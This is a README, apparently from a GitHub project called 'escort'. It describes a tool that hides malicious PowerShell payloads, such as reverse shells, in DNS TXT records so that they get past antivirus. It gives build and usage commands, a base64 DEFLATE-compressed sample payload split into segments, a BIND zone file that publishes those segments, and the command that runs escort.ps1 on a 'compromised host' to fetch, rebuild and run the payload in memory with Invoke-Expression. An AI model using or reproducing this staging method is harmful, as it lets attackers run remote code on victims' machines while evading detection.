# Escort

![](./escort.jpg)

`escort` is an experiment at using DNS TXT records for transmitting malicious payloads to bypass Anti Virus detection. It currently only supports PowerShell payloads (ie reverse shells with powershell) however ideally I will expand this to other potential payload systems. It consists of taking your payload, compressing with DEFLATE and base64 encoding it. If the resultant payload is larger than 255 characters (the maximum limit for DNS TXT records) the payload is broken up into 255 character (or less) segments. When the PowerShell script is ran it will reconstruct the base64 encoded payload, decompress it, and then execute it with the `Invoke-Expression` cmdlet to avoid writing the script to disk.

# Usage

To showcase usage an example payload is included in `payload.txt`

```shell
$> git clone https://github.com/bonedaddy/escort
$> cd escort
$> go build
$> ./escort --input.file payload.txt compress
TJFda/JAEIXv318xF3mbXUyWJH5QDRHa0BahqDRCL8SLmAxma4xiRjSo/71svurVDsOZc56Z1aJUYkbgwRTP5mz9gxFBUOSEOzFFEsE+2iLlYuHP/VLJdHvoCHvwLGx7KBzb0Y1er8tdLacjhjvwoLYUH0hB2WPcXa4LwuVqpak3Bw8sIQb9frd/+3+17u45kSkypknwah/xhWHMKrkBlgFVKT4x21DCOZgZgsWvrhaHFIIH7IHfXBQHnIY7bDZ # part 1
Z4IXES+BPJm9ZtI9ltuE1nsw2TYoKkWoRzOJ1GG2VqcQLVAnO+MmGG8xOZFZj8CB11NrtXAf0eQA6dIAdzjEX85AS1RyDXo8UhMp9SYoLa6TVaFQilmivCon9BbQHFt9HSchaH8My2rq5Tqt9T095wvjdbf7ET/c5Mv7vNwAA//8= # part 2
```

You then want to add these values to your DNS host in order. For example in BIND zone files you would add this as follows:

```bind
$ORIGIN example.org.
@	3600 IN	SOA sns.dns.icann.org. noc.dns.icann.org. (
				2017042745 ; serial
				7200       ; refresh (2 hours)
				3600       ; retry (1 hour)
				1209600    ; expire (2 weeks)
				3600       ; minimum (1 hour)
				)

	3600 IN NS a.iana-servers.net.
	3600 IN NS b.iana-servers.net.

test4   IN TXT   "TJFda/JAEIXv318xF3mbXUyWJH5QDRHa0BahqDRCL8SLmAxma4xiRjSo/71svurVDsOZc56Z1aJUYkbgwRTP5mz9gxFBUOSEOzFFEsE+2iLlYuHP/VLJdHvoCHvwLGx7KBzb0Y1er8tdLacjhjvwoLYUH0hB2WPcXa4LwuVqpak3Bw8sIQb9frd/+3+17u45kSkypknwah/xhWHMKrkBlgFVKT4x21DCOZgZgsWvrhaHFIIH7IHfXBQHnIY7bDZ"
test4   IN TXT   "Z4IXES+BPJm9ZtI9ltuE1nsw2TYoKkWoRzOJ1GG2VqcQLVAnO+MmGG8xOZFZj8CB11NrtXAf0eQA6dIAdzjEX85AS1RyDXo8UhMp9SYoLa6TVaFQilmivCon9BbQHFt9HSchaH8My2rq5Tqt9T095wvjdbf7ET/c5Mv7vNwAA//8="
```

On the compromised host you would run `escort.ps1 as follows:

```
$> .\escort.ps1 -host_name test4.example.org -dns_server 127.0.0.1
```

This will query the host `test4.example.org` for TXT records and use that to construct the payload.


# Caveats

* Due to the usage of DEFLATE the powershell script you are compressing and base64 encoding must be a minimum of 45 characters in length, otherwise you should skip the deflate process as this will just increase the size of your payload, however this will require modifying `escort.ps1` as it expects a base64 encoded DEFLATE compressed payload.
* I haven't actually tested if this evades antivirus detection yet, but that will be done shortly.

# Notes

Brotli offers the best compression of data, however it doesn't appear to be widely supported on Windows unless .NET version >=4.5 is installed so it is temporarily not being used.